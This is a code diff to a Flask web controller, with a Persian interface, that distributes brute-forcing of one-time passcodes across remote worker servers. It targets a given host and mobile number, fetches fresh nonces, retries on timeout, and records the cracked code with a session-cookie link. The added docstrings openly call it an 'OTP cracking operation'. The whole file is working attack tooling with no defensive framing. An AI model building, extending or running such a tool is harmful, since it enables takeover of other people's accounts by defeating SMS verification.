@@ -47,21 +47,24 @@ class AppState:
         self.found_success = False
         self.success_codes = []
         self.proxy_setting = ""
-        self.current_operation = {}
+        self.current_operation = {} # Stores details of the current running operation
         self.lock = threading.Lock()
         self.stop_event = threading.Event()
         # Use a deque for history to automatically manage size
         self.history = deque(maxlen=10)
 
     def reset(self):
+        """Resets the state for a new operation."""
         with self.lock:
             self.progress_log.clear()
             self.found_success = False
             self.success_codes.clear()
-            self.current_operation = {}
+            # current_operation is reset by the caller (start_operation_thread)
+            # after this method, to ensure it has the latest details.
             self.stop_event.clear()
 
     def add_log(self, message):
+        """Adds a message to the progress log and emits it to clients."""
         with self.lock:
             self.progress_log.append(message)
         logging.info(message)
@@ -71,22 +74,24 @@ class AppState:
         socketio.emit('update_progress', {'log': message})
         
     def add_to_history(self, operation_details):
+        """Adds an operation to the history deque."""
         with self.lock:
-            # Avoid adding duplicates
+            # Avoid adding duplicates based on host and mobile
             if not any(h['host'] == operation_details['host'] and h['mobile'] == operation_details['mobile'] for h in self.history):
                 self.history.appendleft(operation_details)
 
     def set_success(self, server, code):
+        """Sets the success flag and records the found code."""
         with self.lock:
             if self.found_success:
-                return
+                return # Only record the first success
             self.found_success = True
             self.success_codes.append({
                 "server": server,
                 "code": code,
                 "cookie_link": f"{server}/last_cookie"
             })
-            self.stop_event.set()
+            self.stop_event.set() # Signal to stop all ongoing operations
 
 app_state = AppState()
 
@@ -167,6 +172,7 @@ def fetch_nonce(host, mobile):
         return None
 
 def send_to_remote_worker(server_url, payload):
+    """Sends a start request to a remote worker server."""
     try:
         requests.post(f"{server_url}/start", json=payload, timeout=10).raise_for_status()
         app_state.add_log(f"✅ Request sent to {server_url} for range {payload['startRange']}-{payload['endRange']}")
@@ -174,6 +180,7 @@ def send_to_remote_worker(server_url, payload):
         app_state.add_log(f"❌ Failed to send request to {server_url}: {e}")
 
 def stop_all_workers(manual_stop=False):
+    """Sends stop signals to all remote worker servers."""
     if manual_stop:
         app_state.stop_event.set()
         app_state.add_log("🛑 Manual stop requested by user.")
@@ -182,9 +189,11 @@ def stop_all_workers(manual_stop=False):
             requests.post(f"{server}/stop", timeout=5)
             logging.info(f"⏹️ Stop request sent to {server}")
         except requests.exceptions.RequestException:
+            # Ignore errors if a worker is already down or unreachable
             pass
 
 def get_workers_status():
+    """Fetches status from all remote worker servers."""
     status_data = {}
     threads = []
     def check_server(server):
@@ -196,7 +205,7 @@ def get_workers_status():
                 code = status["error"].split("Code ")[1].split(" found")[0]
                 app_state.add_log(f"🎉 Success on {server}! Code: {code}.")
                 app_state.set_success(server, code)
-                stop_all_workers()
+                stop_all_workers() # Stop all workers once a success is found
         except requests.exceptions.RequestException as e:
             status_data[server] = {"running": False, "current_range": {"start": "-", "end": "-"}, "processed": "-", "error": f"Connection failed"}
     for server in REMOTE_SERVERS:
@@ -211,31 +220,58 @@ def get_workers_status():
 # ==============================================================================
 
 def operation_manager(operation_details):
+    """Manages the OTP cracking operation across multiple attempts and workers."""
     app_state.add_log("🔄 Operation Manager Started.")
-    for attempt in range(1, 4):
-        if app_state.stop_event.is_set():
-            app_state.add_log("Operation cancelled.")
-            break
-        app_state.add_log(f"🚀 Starting attempt #{attempt}...")
-        threads = [threading.Thread(target=send_to_remote_worker, args=(REMOTE_SERVERS[i], {**operation_details, 'startRange': r[0], 'endRange': r[1]})) for i, r in enumerate(operation_details['ranges'])]
-        for t in threads: t.start()
-        for t in threads: t.join()
-        stopped = app_state.stop_event.wait(timeout=40 * 60)
-        if stopped:
-            app_state.add_log("✅ Operation finished or stopped." if app_state.found_success else "⏹️ Operation stopped manually.")
-            break
-        else:
-            app_state.add_log("⏳ Timeout reached. Restarting.")
-            stop_all_workers()
-            time.sleep(5)
-            new_nonce = fetch_nonce(operation_details['host'], operation_details['mobile'])
-            if new_nonce:
-                operation_details['nonce'] = new_nonce
-            else:
-                app_state.add_log("❌ Failed to get new nonce. Aborting.")
+    try:
+        for attempt in range(1, 4): # Try up to 3 attempts
+            if app_state.stop_event.is_set():
+                app_state.add_log("Operation cancelled.")
+                break # Exit loop if stop signal is received
+            
+            app_state.add_log(f"🚀 Starting attempt #{attempt}...")
+            
+            # Create and start threads for each remote worker
+            threads = [
+                threading.Thread(target=send_to_remote_worker, args=(REMOTE_SERVERS[i], {
+                    **operation_details, 
+                    'startRange': r[0], 
+                    'endRange': r[1]
+                })) 
+                for i, r in enumerate(operation_details['ranges'])
+            ]
+            for t in threads: 
+                t.start()
+            for t in threads: 
+                t.join() # Wait for all worker requests to be sent
+
+            # Wait for a success signal or timeout
+            stopped = app_state.stop_event.wait(timeout=40 * 60) # 40 minutes timeout
+            
+            if stopped:
+                # Operation finished (success found) or stopped manually
+                app_state.add_log("✅ Operation finished or stopped." if app_state.found_success else "⏹️ Operation stopped manually.")
                 break
-    app_state.add_log("🔚 Operation Manager Finished.")
-    stop_all_workers()
+            else:
+                # Timeout reached, restart the process
+                app_state.add_log("⏳ Timeout reached. Restarting.")
+                stop_all_workers() # Stop current workers before restarting
+                time.sleep(5) # Give workers a moment to stop
+                
+                # Fetch a new nonce for the next attempt
+                new_nonce = fetch_nonce(operation_details['host'], operation_details['mobile'])
+                if new_nonce:
+                    operation_details['nonce'] = new_nonce # Update nonce for the next attempt
+                else:
+                    app_state.add_log("❌ Failed to get new nonce. Aborting.")
+                    break # Abort if new nonce cannot be fetched
+    finally:
+        # This block ensures that 'is_running' is set to False 
+        # and workers are stopped, regardless of how the operation_manager exits.
+        with app_state.lock:
+            if 'is_running' in app_state.current_operation:
+                app_state.current_operation['is_running'] = False
+        app_state.add_log("🔚 Operation Manager Finished.")
+        stop_all_workers() # Ensure all workers are stopped
 
 # ==============================================================================
 # Flask Routes
@@ -303,8 +339,8 @@ def index():
                         <div id="success-body" class="space-y-2"><p class="text-gray-400">هنوز کدی یافت نشده است.</p></div>
                     </div>
                     <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
-                         <h2 class="text-2xl font-bold mb-4">لاگ‌ها</h2>
-                         <div id="logs-container" class="h-80 overflow-y-auto bg-gray-900 rounded-md p-2 space-y-1 text-sm font-mono"></div>
+                            <h2 class="text-2xl font-bold mb-4">لاگ‌ها</h2>
+                            <div id="logs-container" class="h-80 overflow-y-auto bg-gray-900 rounded-md p-2 space-y-1 text-sm font-mono"></div>
                     </div>
                 </div>
             </main>
@@ -460,8 +496,9 @@ def start_operation_thread(operation_details, is_from_history=False):
     if not is_from_history:
         app_state.add_to_history(operation_details)
     
-    app_state.reset()
-    app_state.current_operation = operation_details
+    app_state.reset() # Reset state for a new operation
+    # Set the current operation details, including the is_running flag
+    app_state.current_operation = operation_details 
     app_state.proxy_setting = operation_details.get('proxy', '')
 
     host = operation_details['host']
@@ -475,15 +512,23 @@ def start_operation_thread(operation_details, is_from_history=False):
         nonce = fetch_nonce(host, mobile)
         if not nonce:
             app_state.add_log("Failed to start: Could not fetch nonce.")
+            # Ensure is_running is false if we fail to start
+            with app_state.lock:
+                if 'is_running' in app_state.current_operation:
+                    app_state.current_operation['is_running'] = False
             return
         operation_details['nonce'] = nonce
 
+    # Start the operation manager in a new thread
     threading.Thread(target=operation_manager, args=(operation_details,)).start()
 
 @app.route('/start', methods=['POST'])
 def start_new_operation():
+    """Endpoint to start a new OTP cracking operation."""
+    # Check if an operation is already in progress to avoid conflicts (409)
     if app_state.current_operation.get('is_running'):
         return jsonify({"error": "An operation is already in progress."}), 409
+    
     data = request.get_json()
     scan_type = data.get('scan_type', 'full')
     if scan_type == 'full':
@@ -491,6 +536,7 @@ def start_new_operation():
     else:
         try:
             start_r, end_r = int(data['start_range']), int(data['end_range'])
+            # Divide the custom range into chunks for each remote server
             chunk_size = (end_r - start_r) // len(REMOTE_SERVERS)
             ranges = [(start_r + i * chunk_size, start_r + (i + 1) * chunk_size -1) for i in range(len(REMOTE_SERVERS)-1)]
             ranges.append((start_r + (len(REMOTE_SERVERS)-1)*chunk_size, end_r))
@@ -500,13 +546,14 @@ def start_new_operation():
     operation_details = {
         'host': data['host'], 'mobile': data['mobile'], 'nonce': data.get('nonce'),
         'connections': int(data['connections']), 'proxy': data.get('proxy'),
-        'ranges': ranges, 'is_running': True
+        'ranges': ranges, 'is_running': True # Mark as running
     }
     start_operation_thread(operation_details)
     return jsonify({"message": "Operation started."}), 202
 
 @app.route('/resend/<int:index>', methods=['POST'])
 def resend_from_history(index):
+    """Endpoint to resend an operation from history."""
     if app_state.current_operation.get('is_running'):
         return jsonify({"error": "An operation is already in progress."}), 409
     with app_state.lock:
@@ -514,14 +561,16 @@ def resend_from_history(index):
             return jsonify({"error": "Invalid history index."}), 404
         operation_details = app_state.history[index].copy()
     
-    # Force refetch of nonce by removing the old one
-    operation_details.pop('nonce', None)
+    # Force refetch of nonce by removing the old one, as it might be expired
+    operation_details.pop('nonce', None) 
     start_operation_thread(operation_details, is_from_history=True)
     return jsonify({"message": "Resend operation started."}), 202
 
 @app.route('/stop', methods=['POST'])
 def stop_operation():
+    """Endpoint to manually stop the current operation."""
     stop_all_workers(manual_stop=True)
+    # Explicitly set is_running to False on manual stop
     with app_state.lock:
         if 'is_running' in app_state.current_operation:
             app_state.current_operation['is_running'] = False
@@ -529,17 +578,21 @@ def stop_operation():
 
 @app.route('/get_status', methods=['GET'])
 def get_status():
+    """Endpoint to get the status of all remote workers."""
     return jsonify(get_workers_status())
 
 @app.route('/get_success', methods=['GET'])
 def get_success():
+    """Endpoint to get the list of successfully found codes."""
     with app_state.lock:
         return jsonify(list(app_state.success_codes))
 
 @app.route('/get_history', methods=['GET'])
 def get_history():
+    """Endpoint to get the history of past operations."""
     with app_state.lock:
         return jsonify(list(app_state.history))
 
 if __name__ == '__main__':
+    # Run the Flask app with SocketIO
     socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
